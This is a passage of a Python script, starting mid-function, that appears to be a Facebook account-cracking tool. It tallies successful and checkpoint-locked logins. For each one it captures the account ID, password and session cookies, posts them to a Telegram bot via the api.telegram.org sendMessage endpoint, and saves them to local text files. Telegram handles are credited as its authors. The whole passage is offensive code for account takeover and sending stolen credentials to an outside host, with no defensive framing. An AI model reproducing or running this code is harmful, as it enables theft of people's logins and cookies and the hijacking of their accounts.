ok += 1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'''
{F}[√]{F}HITS{F} : {X}{ok}{X}
{B}[+]{B}CP{B} : {C}{no}{C}
{Z}[*]{Z}ERORR{Z} : {M}{error}{M}
[√]ID{A} : {idf}{M} | Password{X} : {psw}{M}
[#] BY : @maho_s9
            ''')
                    tlg = (f'''
 Good Login
 -------------+------------+----------------    
 ID = {idf}
 -------------+------------+----------------    
 Password = {psw}
 -------------+------------+----------------    
 Cookies = {cook}
 -------------+------------+----------------    
 BY : @SA5MI2017 | @SA5MI2017
            ''')
                    print(F+tlg)
                    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=" + str(tlg))
                    with open('Facebook_OK.txt', 'a') as x:
                        x.write(idf + ":" + psw + '\n' + tlg)
                elif "checkpoint" in session.cookies.get_dict():
                    no += 1
                    cook = (";").join(["%s=%s" % (key, value) for key, value in session.cookies.get_dict().items()])
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'''
{F}[√]{F}HITS{F} : {X}{ok}{X}
{B}[+]{B}CP{B} : {C}{no}{C}
{Z}[*]{Z}ERORR{Z} : {M}{error}{M}
[√]ID{A} : {idf}{M} | Password{X} : {psw}{M}
[#] BY : @maho_s9
            ''')
                    tlg = (f'''
            حساب سيكور
-------------+------------+----------------    
ID = {idf}
-------------+------------+----------------    
Password = {psw}
-------------+------------+----------------    
Cookies = {cook}
-------------+------------+---------------- 
BY : @SA5MI2017 | @SA5MI2017
                ''')
                    print(B+tlg)
                    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=" + str(tlg))
                    with open('Facebook_CP.txt', 'a') as x:
                        x.write(idf + ":" + psw + '\n' + tlg)
                else:
                    error += 1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'''
{F}[√]{F}HITS{F} : {X}{ok}{X}
{B}[+]{B}CP{B} : {C}{no}{C}
{Z}[*]{Z}ERORR{Z} : {M}{error}{M}
[√]ID{A} : {idf}{M} | Password{X} : {psw}{M}
[#] BY : @SA5MI2017
            ''')
    except Exception as e:
        print(f"Error: {e}")
        
Facebook()